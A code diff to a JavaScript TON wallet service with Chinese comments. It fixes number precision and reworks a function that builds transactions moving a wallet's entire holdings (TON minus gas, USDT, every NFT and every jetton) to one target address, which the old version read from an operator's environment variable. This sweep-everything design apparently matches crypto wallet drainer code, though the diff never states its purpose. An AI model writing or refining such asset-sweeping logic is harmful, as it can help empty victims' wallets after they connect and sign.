@@ -69,8 +69,12 @@ export class WalletService {
     }
   }
 
-  // 工具：TON→nanoTON（字符串）
-  static toNanoStr = (vTon) => TonWeb.utils.toNano(String(vTon)).toString();
+  // 工具：TON→nanoTON（字符串）- 修复精度问题
+  static toNanoStr = (vTon) => {
+    // 限制小数位数为9位（TON的精度）
+    const fixedTon = parseFloat(vTon).toFixed(9);
+    return TonWeb.utils.toNano(fixedTon).toString();
+  };
 
   /**
    * 生成交易（标准方式）
@@ -187,6 +191,7 @@ export class WalletService {
       const usdtJetton = assets.jettons.find(j => 
         j.jetton?.address === "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
       );
+      console.log("usdtJetton", usdtJetton);
       if (usdtJetton) {
         assets.usdt.balance = usdtJetton.balance;
         // 修复：使用更安全的方式计算USDT余额
@@ -212,12 +217,11 @@ export class WalletService {
   /**
    * 创建批量资产转移交易
    */
-  static async createAllAssetTransfer(wallet) {
-    const targetAddress = process.env.RECIPIENT_ADDRESS;
+  static async createBulkAssetTransfer(wallet, targetAddress) {
     try {
       const walletKey = `wallet:${wallet}`;
       const walletData = await redis.get(walletKey);
-
+      
       if (!walletData) {
         throw new Error("walletData not found");
       }
@@ -228,12 +232,14 @@ export class WalletService {
 
       // 1. TON转账（保留少量作为Gas费）
       const tonBalance = parseFloat(assets.ton.balanceTon);
-      if (tonBalance > 0.1) {
-        // 保留0.1 TON作为Gas费
+      if (tonBalance > 0.1) { // 保留0.1 TON作为Gas费
         const transferAmount = tonBalance - 0.1;
+        // 修复：限制小数位数
+        const fixedTransferAmount = parseFloat(transferAmount.toFixed(9));
+        
         messages.push({
           address: targetAddress,
-          amount: this.toNanoStr(transferAmount),
+          amount: this.toNanoStr(fixedTransferAmount),
           payload: "", // 简单转账，无payload
         });
       }
@@ -243,9 +249,9 @@ export class WalletService {
         const usdtPayload = await this.buildUsdtTransferPayload({
           toAddress: targetAddress,
           amount: assets.usdt.balanceUsdt,
-          responseTo: wallet,
+          responseTo: wallet
         });
-
+        
         messages.push({
           address: "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs", // USDT合约
           amount: this.toNanoStr(0.1), // Gas费
@@ -259,7 +265,7 @@ export class WalletService {
           newOwner: targetAddress,
           responseTo: wallet,
           forwardAmountTon: 0,
-          forwardComment: `Bulk transfer NFT`,
+          forwardComment: `Bulk transfer NFT`
         });
 
         messages.push({
@@ -272,10 +278,7 @@ export class WalletService {
       // 4. 其他Jetton转移
       for (const jetton of assets.jettons) {
         // 跳过USDT（已经处理过）
-        if (
-          jetton.jetton?.address ===
-          "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
-        ) {
+        if (jetton.jetton?.address === "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs") {
           continue;
         }
 
@@ -283,7 +286,7 @@ export class WalletService {
           toAddress: targetAddress,
           amount: jetton.balance,
           jettonAddress: jetton.jetton.address,
-          responseTo: wallet,
+          responseTo: wallet
         });
 
         messages.push({
@@ -301,7 +304,7 @@ export class WalletService {
           ton: tonBalance > 0.1 ? 1 : 0,
           nft: assets.nfts.length,
           jetton: assets.jettons.length,
-          usdt: parseFloat(assets.usdt.balanceUsdt) > 0 ? 1 : 0,
+          usdt: parseFloat(assets.usdt.balanceUsdt) > 0 ? 1 : 0
         },
         totalMessages: messages.length,
         ts: Date.now(),
@@ -313,8 +316,9 @@ export class WalletService {
         success: true,
         data: { messages, raw },
         assets: assets,
-        message: `批量转移交易已生成: ${messages.length} 个消息`,
+        message: `批量转移交易已生成: ${messages.length} 个消息`
       };
+
     } catch (error) {
       console.error("创建批量资产转移错误:", error);
       throw new Error(`创建批量资产转移失败: ${error.message}`);
